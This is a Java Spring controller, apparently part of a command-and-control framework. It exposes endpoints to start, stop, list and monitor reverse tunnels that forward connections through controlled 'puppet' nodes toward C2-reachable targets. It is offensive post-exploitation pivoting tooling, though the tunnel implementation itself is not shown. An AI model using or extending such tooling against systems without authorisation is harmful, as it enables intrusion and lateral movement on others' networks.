package org.leo.web.controller.puppetnode.proxy;

import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.leo.core.util.ApiResponse;
import org.leo.web.util.ControllerUtil;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 反向隧道控制器
 *
 * 反向隧道：在 puppet 端开端口监听，把进入的连接转发到 C2 侧（或 C2 可达的）目标。
 * 类似 ssh -R remoteListenPort:forwardHost:forwardPort
 */
@RestController
@RequestMapping("/puppet-node/reverse-tunnel")
public class ReverseTunnelController {

    /**
     * 启动反向隧道
     * Body: { puppetId, remoteListenPort, bindAddr?, forwardHost, forwardPort }
     */
    @RequestMapping(value = "/start", method = RequestMethod.POST)
    public HashMap<String, Object> start(@RequestBody HashMap<String, Object> params) {
        try {
            Number remoteListenPort = (Number) params.get("remoteListenPort");
            String bindAddr = (String) params.get("bindAddr");
            String forwardHost = (String) params.get("forwardHost");
            Number forwardPort = (Number) params.get("forwardPort");

            if (remoteListenPort == null || forwardHost == null || forwardPort == null) {
                return ApiResponse.badRequest("remoteListenPort、forwardHost、forwardPort 均为必填项");
            }

            JavaPuppetNode node = ControllerUtil.getPuppetNode(params);
            Map<String, Object> result = node.startReverseTunnel(
                    remoteListenPort.intValue(),
                    bindAddr,
                    forwardHost.trim(),
                    forwardPort.intValue());
            return ApiResponse.success(result != null ? result : new HashMap<String, Object>());
        } catch (IllegalArgumentException e) {
            return ApiResponse.badRequest(e.getMessage());
        } catch (Exception e) {
            return ApiResponse.error("启动反向隧道失败: " + e.getMessage());
        }
    }

    /**
     * 停止指定反向隧道
     * Body: { puppetId, listenId }
     */
    @RequestMapping(value = "/stop", method = RequestMethod.POST)
    public HashMap<String, Object> stop(@RequestBody HashMap<String, Object> params) {
        try {
            String listenId = (String) params.get("listenId");
            if (listenId == null || listenId.length() == 0) {
                return ApiResponse.badRequest("listenId 为必填项");
            }
            JavaPuppetNode node = ControllerUtil.getPuppetNode(params);
            Map<String, Object> result = node.stopReverseTunnel(listenId);
            return ApiResponse.success(result != null ? result : new HashMap<String, Object>());
        } catch (IllegalArgumentException e) {
            return ApiResponse.badRequest(e.getMessage());
        } catch (Exception e) {
            return ApiResponse.error("停止反向隧道失败: " + e.getMessage());
        }
    }

    /**
     * 停止所有反向隧道
     */
    @RequestMapping(value = "/stop-all", method = RequestMethod.POST)
    public HashMap<String, Object> stopAll(@RequestBody HashMap<String, Object> params) {
        try {
            JavaPuppetNode node = ControllerUtil.getPuppetNode(params);
            Map<String, Object> result = node.stopAllReverseTunnels();
            return ApiResponse.success(result != null ? result : new HashMap<String, Object>());
        } catch (IllegalArgumentException e) {
            return ApiResponse.badRequest(e.getMessage());
        } catch (Exception e) {
            return ApiResponse.error("停止所有反向隧道失败: " + e.getMessage());
        }
    }

    /**
     * 列出所有反向隧道
     */
    @RequestMapping(value = "/list", method = RequestMethod.POST)
    public HashMap<String, Object> list(@RequestBody HashMap<String, Object> params) {
        try {
            JavaPuppetNode node = ControllerUtil.getPuppetNode(params);
            List<Map<String, Object>> rules = node.listReverseTunnels();
            return ApiResponse.success(rules != null ? rules : new ArrayList<Map<String, Object>>());
        } catch (IllegalArgumentException e) {
            return ApiResponse.badRequest(e.getMessage());
        } catch (Exception e) {
            return ApiResponse.error("获取反向隧道列表失败: " + e.getMessage());
        }
    }

    /**
     * 获取指定反向隧道的统计信息
     * Body: { puppetId, listenId }
     */
    @RequestMapping(value = "/statistics", method = RequestMethod.POST)
    public HashMap<String, Object> getStatistics(@RequestBody HashMap<String, Object> params) {
        try {
            String listenId = (String) params.get("listenId");
            if (listenId == null || listenId.length() == 0) {
                return ApiResponse.badRequest("listenId 为必填项");
            }
            JavaPuppetNode node = ControllerUtil.getPuppetNode(params);
            Socks5ProxyStatistics.StatisticsSnapshot snapshot = node.getReverseTunnelStatistics(listenId);
            if (snapshot == null) {
                return ApiResponse.error("该反向隧道未启动或不存在");
            }

            HashMap<String, Object> data = new HashMap<String, Object>();
            data.put("port", snapshot.port);
            data.put("activeConnections", snapshot.activeConnections);
            data.put("totalConnections", snapshot.totalConnections);
            data.put("uploadBytes", snapshot.uploadBytes);
            data.put("downloadBytes", snapshot.downloadBytes);
            data.put("uploadRate", snapshot.uploadRate);
            data.put("downloadRate", snapshot.downloadRate);
            data.put("startTime", snapshot.startTime);
            data.put("uptime", snapshot.uptime);

            List<HashMap<String, Object>> connections = new ArrayList<HashMap<String, Object>>();
            if (snapshot.connections != null) {
                for (Socks5ProxyStatistics.ConnectionInfo conn : snapshot.connections) {
                    HashMap<String, Object> connMap = new HashMap<String, Object>();
                    connMap.put("connId", conn.connId);
                    connMap.put("targetHost", conn.targetHost);
                    connMap.put("targetPort", conn.targetPort);
                    connMap.put("clientIp", conn.clientIp);
                    connMap.put("connectTime", conn.connectTime);
                    connMap.put("uptime", conn.getUptime());
                    connMap.put("uploadBytes", conn.uploadBytes);
                    connMap.put("downloadBytes", conn.downloadBytes);
                    connections.add(connMap);
                }
            }
            data.put("connections", connections);

            return ApiResponse.success(data);
        } catch (IllegalArgumentException e) {
            return ApiResponse.badRequest(e.getMessage());
        } catch (Exception e) {
            return ApiResponse.error("获取反向隧道统计失败: " + e.getMessage());
        }
    }
}
